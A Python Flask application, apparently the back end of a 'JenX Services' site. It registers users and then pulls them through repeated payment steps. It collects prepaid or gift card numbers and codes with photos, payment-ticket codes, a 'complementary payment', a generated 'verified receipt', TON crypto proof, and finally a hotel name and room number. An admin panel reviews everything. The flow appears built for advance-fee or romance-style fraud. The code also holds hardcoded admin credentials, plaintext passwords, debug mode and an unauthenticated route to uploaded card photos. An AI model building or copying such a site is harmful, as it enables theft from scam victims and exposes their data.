# app.py
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, session
import os
import json
import uuid
import datetime

app = Flask(__name__)
# Une clé secrète est nécessaire pour les sessions Flask.
# En production, utilisez une chaîne aléatoire et complexe.
app.secret_key = 'votre_cle_secrete_tres_securisee_ici'

# Chemins pour le stockage des données et des uploads
UPLOAD_FOLDER = 'uploads'
DATA_FOLDER = 'data'
RECEIPTS_FOLDER = 'receipts'

# Créer les dossiers si ils n'existent pas
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DATA_FOLDER, exist_ok=True)
os.makedirs(RECEIPTS_FOLDER, exist_ok=True)

# Chemin du fichier JSON pour les utilisateurs
USERS_FILE = os.path.join(DATA_FOLDER, 'users.json')

def load_users():
    """Charge les données des utilisateurs depuis le fichier JSON."""
    if not os.path.exists(USERS_FILE) or os.stat(USERS_FILE).st_size == 0:
        return {}
    with open(USERS_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)

def save_users(users_data):
    """Sauvegarde les données des utilisateurs dans le fichier JSON."""
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users_data, f, indent=4)

# --- Fonctions de notification (placeholders) ---
def send_email_notification(recipient_email, subject, body):
    """
    Placeholder pour l'envoi de notification par email.
    En production, intégrez une bibliothèque d'envoi d'emails (ex: smtplib, Flask-Mail).
    """
    print(f"--- Envoi Email à {recipient_email} ---")
    print(f"Sujet: {subject}")
    print(f"Corps: {body}\n")

def send_telegram_notification(chat_id, message):
    """
    Placeholder pour l'envoi de notification par Telegram.
    En production, intégrez la bibliothèque python-telegram-bot.
    """
    print(f"--- Envoi Telegram à {chat_id} ---")
    print(f"Message: {message}\n")

# --- Routes de l'application ---

@app.route('/')
def index():
    """Page d'accueil - formulaire d'inscription."""
    return render_template('register.html')

@app.route('/register', methods=['POST'])
def register():
    """Gère l'inscription de l'utilisateur."""
    name = request.form['name']
    first_name = request.form['first_name']
    age = request.form['age']
    email = request.form['email']
    password = request.form['password'] # En production, hachez les mots de passe !
    currency = request.form['currency']

    users = load_users()
    user_id = str(uuid.uuid4()) # Génère un ID unique pour l'utilisateur

    # Stocke les informations de l'utilisateur
    users[user_id] = {
        'name': name,
        'first_name': first_name,
        'age': age,
        'email': email,
        'password': password, # Mot de passe en clair pour l'exemple, à sécuriser !
        'currency': currency,
        'status': 'registered',
        'admin_status': 'pending', # Nouveau statut pour l'admin
        'registration_date': datetime.datetime.now().isoformat()
    }
    save_users(users)

    # Stocke l'ID utilisateur et la devise dans la session pour les étapes suivantes
    session['user_id'] = user_id
    session['currency'] = currency

    # Placeholder pour la notification admin lors de l'inscription
    admin_email = "admin@jenxservices.com" # Remplacez par l'email de l'admin
    send_email_notification(admin_email, 
                            "Nouvelle inscription JenX Services",
                            f"Un nouvel utilisateur s'est inscrit: {email} ({name} {first_name})")
    # Si vous avez un chat_id Telegram pour l'admin
    # admin_telegram_chat_id = "YOUR_TELEGRAM_CHAT_ID"
    # send_telegram_notification(admin_telegram_chat_id, 
    #                            f"Nouvelle inscription: {email} ({name} {first_name})")

    # Redirige vers la page de choix du mode de paiement
    return redirect(url_for('payment_choice'))

@app.route('/payment_choice')
def payment_choice():
    """Page de choix du mode de paiement."""
    # Assurez-vous que l'utilisateur est dans la session
    if 'user_id' not in session:
        return redirect(url_for('index'))
    currency = session.get('currency', '€') # Récupère la devise de la session
    return render_template('payment_choice.html', currency=currency)

@app.route('/submit_payment_method', methods=['POST'])
def submit_payment_method():
    """Gère la soumission du mode de paiement choisi et redirige vers le formulaire dynamique."""
    if 'user_id' not in session:
        return redirect(url_for('index'))

    payment_method = request.form['payment_method']
    user_id = session['user_id']
    users = load_users()

    # Met à jour le mode de paiement de l'utilisateur
    if user_id in users:
        users[user_id]['payment_method'] = payment_method
        save_users(users)
        
        # Redirige vers le formulaire dynamique approprié
        if payment_method == 'card':
            return redirect(url_for('dynamic_form_card'))
        elif payment_method == 'ticket':
            return redirect(url_for('dynamic_form_ticket'))
    
    return redirect(url_for('payment_choice')) # En cas d'erreur, redirige vers le choix

@app.route('/dynamic_form_card')
def dynamic_form_card():
    """Formulaire dynamique pour carte prépayée/cadeau."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    currency = session.get('currency', '€')
    return render_template('dynamic_form_card.html', currency=currency)

@app.route('/upload_card_details', methods=['POST'])
def upload_card_details():
    """Gère l'upload des détails et images de carte."""
    if 'user_id' not in session:
        return redirect(url_for('index'))

    user_id = session['user_id']
    users = load_users()

    if user_id not in users:
        return jsonify({'status': 'error', 'message': 'Utilisateur non trouvé.'}), 404

    # Récupère les données du formulaire
    card_type = request.form.get('card_type')
    card_number = request.form.get('card_number')
    card_code = request.form.get('card_code')
    card_date = request.form.get('card_date')
    card_amount = request.form.get('card_amount')

    # Gère les uploads de fichiers
    recto_file = request.files.get('recto_photo')
    verso_file = request.files.get('verso_photo')

    card_data = {
        'type': card_type,
        'number': card_number,
        'code': card_code,
        'date': card_date,
        'amount': card_amount,
        'recto_photo': None,
        'verso_photo': None
    }

    if recto_file and recto_file.filename != '':
        filename_recto = f"{user_id}_card_recto_{uuid.uuid4().hex[:8]}{os.path.splitext(recto_file.filename)[1]}"
        filepath_recto = os.path.join(UPLOAD_FOLDER, filename_recto)
        recto_file.save(filepath_recto)
        card_data['recto_photo'] = filename_recto

    if verso_file and verso_file.filename != '':
        filename_verso = f"{user_id}_card_verso_{uuid.uuid4().hex[:8]}{os.path.splitext(verso_file.filename)[1]}"
        filepath_verso = os.path.join(UPLOAD_FOLDER, filename_verso)
        verso_file.save(filepath_verso)
        card_data['verso_photo'] = filename_verso

    # Met à jour les données de l'utilisateur
    users[user_id]['payment_details'] = card_data
    users[user_id]['status'] = 'card_details_submitted'
    save_users(users)

    # Notification admin
    admin_email = "admin@jenxservices.com"
    user_email = users[user_id]['email']
    send_email_notification(admin_email, 
                            "Nouveaux détails de carte soumis",
                            f"L'utilisateur {user_email} a soumis les détails de sa carte ({card_type}, {card_amount} {users[user_id]['currency']}).")

    return redirect(url_for('waiting_page'))

@app.route('/dynamic_form_ticket')
def dynamic_form_ticket():
    """Formulaire dynamique pour ticket physique."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    currency = session.get('currency', '€')
    return render_template('dynamic_form_ticket.html', currency=currency)

@app.route('/upload_ticket_details', methods=['POST'])
def upload_ticket_details():
    """Gère l'upload des détails et images de ticket."""
    if 'user_id' not in session:
        return redirect(url_for('index'))

    user_id = session['user_id']
    users = load_users()

    if user_id not in users:
        return jsonify({'status': 'error', 'message': 'Utilisateur non trouvé.'}), 404

    # Gère l'upload de la photo du ticket d'abord
    ticket_file = request.files.get('ticket_photo')
    ticket_photo_filename = None
    if ticket_file and ticket_file.filename != '':
        ticket_photo_filename = f"{user_id}_ticket_{uuid.uuid4().hex[:8]}{os.path.splitext(ticket_file.filename)[1]}"
        filepath_ticket = os.path.join(UPLOAD_FOLDER, ticket_photo_filename)
        ticket_file.save(filepath_ticket)

    # Récupère les données du formulaire
    ticket_code = request.form.get('ticket_code')
    ticket_amount = request.form.get('ticket_amount')
    ticket_type = request.form.get('ticket_type')
    ticket_expiration = request.form.get('ticket_expiration')

    ticket_data = {
        'code': ticket_code,
        'amount': ticket_amount,
        'type': ticket_type,
        'expiration': ticket_expiration,
        'ticket_photo': ticket_photo_filename
    }

    # Met à jour les données de l'utilisateur
    users[user_id]['payment_details'] = ticket_data
    users[user_id]['status'] = 'ticket_details_submitted'
    save_users(users)

    # Notification admin
    admin_email = "admin@jenxservices.com"
    user_email = users[user_id]['email']
    send_email_notification(admin_email, 
                            "Nouveaux détails de ticket soumis",
                            f"L'utilisateur {user_email} a soumis les détails de son ticket ({ticket_type}, {ticket_amount} {users[user_id]['currency']}).")

    return redirect(url_for('waiting_page'))

@app.route('/waiting_page')
def waiting_page():
    """Page d'attente avec compte à rebours."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    return render_template('waiting.html')

@app.route('/complementary_payment')
def complementary_payment():
    """Page de paiement complémentaire."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    user_id = session['user_id']
    users = load_users()
    user_data = users.get(user_id, {})
    
    currency = session.get('currency', '€')
    payment_method = user_data.get('payment_method', 'card') # Récupère le mode de paiement initial

    return render_template('complementary_payment.html', currency=currency, payment_method=payment_method)

@app.route('/submit_complementary_payment', methods=['POST'])
def submit_complementary_payment():
    """Gère la soumission du paiement complémentaire."""
    if 'user_id' not in session:
        return redirect(url_for('index'))

    user_id = session['user_id']
    users = load_users()

    if user_id not in users:
        return jsonify({'status': 'error', 'message': 'Utilisateur non trouvé.'}), 404

    payment_method = users[user_id].get('payment_method')

    complementary_data = {}
    if payment_method == 'card':
        complementary_data = {
            'type': request.form.get('card_type'),
            'number': request.form.get('card_number'),
            'code': request.form.get('card_code'),
            'date': request.form.get('card_date'),
            'amount': request.form.get('card_amount'),
            'recto_photo': None,
            'verso_photo': None
        }
        recto_file = request.files.get('recto_photo')
        verso_file = request.files.get('verso_photo')

        if recto_file and recto_file.filename != '':
            filename_recto = f"{user_id}_comp_card_recto_{uuid.uuid4().hex[:8]}{os.path.splitext(recto_file.filename)[1]}"
            filepath_recto = os.path.join(UPLOAD_FOLDER, filename_recto)
            recto_file.save(filepath_recto)
            complementary_data['recto_photo'] = filename_recto

        if verso_file and verso_file.filename != '':
            filename_verso = f"{user_id}_comp_card_verso_{uuid.uuid4().hex[:8]}{os.path.splitext(verso_file.filename)[1]}"
            filepath_verso = os.path.join(UPLOAD_FOLDER, filename_verso)
            verso_file.save(filepath_verso)
            complementary_data['verso_photo'] = filename_verso

    elif payment_method == 'ticket':
        ticket_file = request.files.get('ticket_photo')
        ticket_photo_filename = None
        if ticket_file and ticket_file.filename != '':
            ticket_photo_filename = f"{user_id}_comp_ticket_{uuid.uuid4().hex[:8]}{os.path.splitext(ticket_file.filename)[1]}"
            filepath_ticket = os.path.join(UPLOAD_FOLDER, ticket_photo_filename)
            ticket_file.save(filepath_ticket)

        complementary_data = {
            'code': request.form.get('ticket_code'),
            'amount': request.form.get('ticket_amount'),
            'type': request.form.get('ticket_type'),
            'expiration': request.form.get('ticket_expiration'),
            'ticket_photo': ticket_photo_filename
        }
    
    users[user_id]['complementary_payment_details'] = complementary_data
    users[user_id]['complementary_payment_confirmed'] = True
    users[user_id]['status'] = 'complementary_payment_submitted'
    save_users(users)

    # Notification admin
    admin_email = "admin@jenxservices.com"
    user_email = users[user_id]['email']
    send_email_notification(admin_email, 
                            "Paiement complémentaire soumis",
                            f"L'utilisateur {user_email} a soumis les détails du paiement complémentaire ({complementary_data.get('amount', 'N/A')} {users[user_id]['currency']}).")

    return redirect(url_for('receipt'))

@app.route('/receipt')
def receipt():
    """Page de reçu vérifié."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    user_id = session['user_id']
    users = load_users()
    user_data = users.get(user_id, {})

    # Génère un code unique de 16 caractères aléatoires
    unique_code = str(uuid.uuid4()).replace('-', '')[:16].upper()
    user_data['receipt_code'] = unique_code
    user_data['status'] = 'receipt_generated'
    save_users(users) # Sauvegarde le code unique dans les données utilisateur

    # Récupère les informations pour le reçu
    name = user_data.get('name', 'N/A')
    first_name = user_data.get('first_name', 'N/A')
    receipt_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Tente de récupérer le montant et le type du paiement initial
    payment_details = user_data.get('payment_details', {})
    payment_type = payment_details.get('type', 'N/A')
    payment_amount = payment_details.get('amount', 'N/A')
    currency = user_data.get('currency', '€')

    return render_template('receipt.html', 
                           name=name, 
                           first_name=first_name,
                           receipt_date=receipt_date, 
                           payment_type=payment_type, 
                           payment_amount=payment_amount,
                           currency=currency,
                           unique_code=unique_code)

@app.route('/submit_receipt', methods=['POST'])
def submit_receipt():
    """Gère la soumission du reçu."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    user_id = session['user_id']
    users = load_users()
    if user_id in users:
        users[user_id]['status'] = 'receipt_submitted'
        save_users(users)
        # Notification admin
        admin_email = "admin@jenxservices.com"
        user_email = users[user_id]['email']
        send_email_notification(admin_email, 
                                "Reçu soumis par l'utilisateur",
                                f"L'utilisateur {user_email} a soumis son reçu (Code: {users[user_id].get('receipt_code', 'N/A')}).")
    
    return redirect(url_for('crypto_payment')) # Redirige vers l'étape crypto

@app.route('/crypto_payment')
def crypto_payment():
    """Page de paiement en crypto (TON)."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    # Adresse TON (exemple)
    ton_address = "EQCtQdR6B4FcjK...vHwF" 
    return render_template('crypto_payment.html', ton_address=ton_address)

@app.route('/submit_crypto_payment', methods=['POST'])
def submit_crypto_payment():
    """Gère la soumission de la preuve de paiement crypto."""
    if 'user_id' not in session:
        return redirect(url_for('index'))

    user_id = session['user_id']
    users = load_users()

    if user_id not in users:
        return jsonify({'status': 'error', 'message': 'Utilisateur non trouvé.'}), 404

    crypto_proof_file = request.files.get('crypto_proof')
    crypto_proof_filename = None
    if crypto_proof_file and crypto_proof_file.filename != '':
        crypto_proof_filename = f"{user_id}_crypto_proof_{uuid.uuid4().hex[:8]}{os.path.splitext(crypto_proof_file.filename)[1]}"
        filepath_crypto_proof = os.path.join(UPLOAD_FOLDER, crypto_proof_filename)
        crypto_proof_file.save(filepath_crypto_proof)
    
    users[user_id]['crypto_payment_proof'] = crypto_proof_filename
    users[user_id]['status'] = 'crypto_payment_submitted'
    save_users(users)

    # Notification admin
    admin_email = "admin@jenxservices.com"
    user_email = users[user_id]['email']
    send_email_notification(admin_email, 
                            "Preuve de paiement crypto soumise",
                            f"L'utilisateur {user_email} a soumis une preuve de paiement crypto.")

    return redirect(url_for('final_validation'))

@app.route('/final_validation')
def final_validation():
    """Page de validation finale (hôtel, chambre, etc.)."""
    if 'user_id' not in session:
        return redirect(url_for('index'))
    return render_template('final_validation.html')

@app.route('/submit_final_validation', methods=['POST'])
def submit_final_validation():
    """Gère la soumission du formulaire de validation finale."""
    if 'user_id' not in session:
        return redirect(url_for('index'))

    user_id = session['user_id']
    users = load_users()

    if user_id not in users:
        return jsonify({'status': 'error', 'message': 'Utilisateur non trouvé.'}), 404

    hotel_name = request.form.get('hotel_name')
    room_number = request.form.get('room_number')
    expected_date = request.form.get('expected_date')
    final_photo_file = request.files.get('final_photo')

    final_photo_filename = None
    if final_photo_file and final_photo_file.filename != '':
        final_photo_filename = f"{user_id}_final_photo_{uuid.uuid4().hex[:8]}{os.path.splitext(final_photo_file.filename)[1]}"
        filepath_final_photo = os.path.join(UPLOAD_FOLDER, final_photo_filename)
        final_photo_file.save(filepath_final_photo)

    final_validation_data = {
        'hotel_name': hotel_name,
        'room_number': room_number,
        'expected_date': expected_date,
        'final_photo': final_photo_filename
    }

    users[user_id]['final_validation_details'] = final_validation_data
    users[user_id]['status'] = 'final_validation_submitted'
    save_users(users)

    # Dernière notification admin
    admin_email = "admin@jenxservices.com"
    user_email = users[user_id]['email']
    send_email_notification(admin_email, 
                            "Validation finale soumise",
                            f"L'utilisateur {user_email} a soumis les détails de validation finale (Hôtel: {hotel_name}, Chambre: {room_number}).")

    # Fin du flux utilisateur principal, peut rediriger vers une page de confirmation
    return render_template('confirmation_end.html')

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Permet d'accéder aux fichiers uploadés."""
    return send_from_directory(UPLOAD_FOLDER, filename)

# --- Interface Admin ---

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    """Page de connexion de l'admin."""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # Simple vérification pour l'exemple. En production, utilisez des identifiants sécurisés.
        if username == 'michael' and password == 'michael': 
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('admin_login.html', error="Identifiants incorrects")
    return render_template('admin_login.html')

@app.route('/admin_dashboard')
def admin_dashboard():
    """Tableau de bord de l'admin."""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    users = load_users()
    # Convertir les données utilisateur en liste pour faciliter l'affichage dans le template
    users_list = []
    for user_id, user_data in users.items():
        user_data['id'] = user_id # Ajoute l'ID pour référence
        users_list.append(user_data)

    return render_template('admin_dashboard.html', users=users_list)

@app.route('/admin_user_details/<user_id>')
def admin_user_details(user_id):
    """Affiche les détails d'un utilisateur spécifique pour l'admin."""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    users = load_users()
    user_data = users.get(user_id)
    if not user_data:
        return "Utilisateur non trouvé", 404
    
    # Prépare les chemins complets des images pour l'affichage du PAIEMENT INITIAL
    if 'payment_details' in user_data:
        if user_data['payment_method'] == 'card':
            if user_data['payment_details'].get('recto_photo'):
                user_data['payment_details']['recto_photo_url'] = url_for('uploaded_file', filename=user_data['payment_details']['recto_photo'])
            if user_data['payment_details'].get('verso_photo'):
                user_data['payment_details']['verso_photo_url'] = url_for('uploaded_file', filename=user_data['payment_details']['verso_photo'])
        elif user_data['payment_method'] == 'ticket':
            if user_data['payment_details'].get('ticket_photo'):
                user_data['payment_details']['ticket_photo_url'] = url_for('uploaded_file', filename=user_data['payment_details']['ticket_photo'])
    
    # Prépare les chemins complets des images pour l'affichage du PAIEMENT COMPLÉMENTAIRE
    if 'complementary_payment_details' in user_data:
        comp_details = user_data['complementary_payment_details']
        if user_data.get('payment_method') == 'card': # Le mode de paiement complémentaire est le même que l'initial
            if comp_details.get('recto_photo'):
                comp_details['recto_photo_url'] = url_for('uploaded_file', filename=comp_details['recto_photo'])
            if comp_details.get('verso_photo'):
                comp_details['verso_photo_url'] = url_for('uploaded_file', filename=comp_details['verso_photo'])
        elif user_data.get('payment_method') == 'ticket':
            if comp_details.get('ticket_photo'):
                comp_details['ticket_photo_url'] = url_for('uploaded_file', filename=comp_details['ticket_photo'])

    if user_data.get('crypto_payment_proof'):
        user_data['crypto_payment_proof_url'] = url_for('uploaded_file', filename=user_data['crypto_payment_proof'])
    
    if 'final_validation_details' in user_data and user_data['final_validation_details'].get('final_photo'):
        user_data['final_validation_details']['final_photo_url'] = url_for('uploaded_file', filename=user_data['final_validation_details']['final_photo'])


    return render_template('admin_user_details.html', user=user_data)

@app.route('/admin_update_user_status/<user_id>', methods=['POST'])
def admin_update_user_status(user_id):
    """Met à jour le statut d'un utilisateur (Valider/Refuser)."""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    # Récupère l'user_id du chemin URL et aussi du formulaire (pour robustesse)
    user_id_from_route = user_id
    # Note: Le champ caché 'user_id_from_form' n'est plus nécessaire si l'URL est bien formée.
    # Cependant, le laisser ne nuit pas à la robustesse.
    # user_id_from_form = request.form.get('user_id_from_form') 

    target_user_id = user_id_from_route # On se base sur l'ID de l'URL qui est maintenant correct

    action = request.form.get('action') # 'validate' ou 'reject'
    users = load_users()

    if target_user_id in users:
        user_data = users[target_user_id]
        user_email = user_data['email']
        
        if action == 'validate':
            user_data['admin_status'] = 'validated'
            # Notification utilisateur
            send_email_notification(user_email,
                                    "Votre paiement JenX Services a été validé !",
                                    f"Cher(e) {user_data['first_name']},\n\nVotre paiement a été validé par notre équipe. Vous pouvez maintenant procéder à l'étape suivante de votre service.\n\nCordialement,\nL'équipe JenX Services")
            # Si vous avez un chat_id Telegram pour l'utilisateur
            # user_telegram_chat_id = user_data.get('telegram_chat_id') # Assurez-vous de stocker cet ID
            # if user_telegram_chat_id:
            #    send_telegram_notification(user_telegram_chat_id, 
            #                               f"JenX Services: Votre paiement a été validé !")

        elif action == 'reject':
            user_data['admin_status'] = 'rejected'
            # Notification utilisateur
            send_email_notification(user_email,
                                    "Mise à jour concernant votre paiement JenX Services",
                                    f"Cher(e) {user_data['first_name']},\n\nNous avons rencontré un problème avec la vérification de votre paiement. Veuillez vous connecter à votre compte pour plus de détails ou contacter le support.\n\nCordialement,\nL'équipe JenX Services")
            # Si vous avez un chat_id Telegram pour l'utilisateur
            # user_telegram_chat_id = user_data.get('telegram_chat_id')
            # if user_telegram_chat_id:
            #    send_telegram_notification(user_telegram_chat_id, 
            #                               f"JenX Services: Votre paiement a été refusé. Veuillez vérifier votre compte.")
        save_users(users)
    
    return redirect(url_for('admin_dashboard')) # Redirige vers le tableau de bord après l'action


@app.route('/admin_logout')
def admin_logout():
    """Déconnecte l'admin."""
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))


if __name__ == '__main__':
    app.run(debug=True)

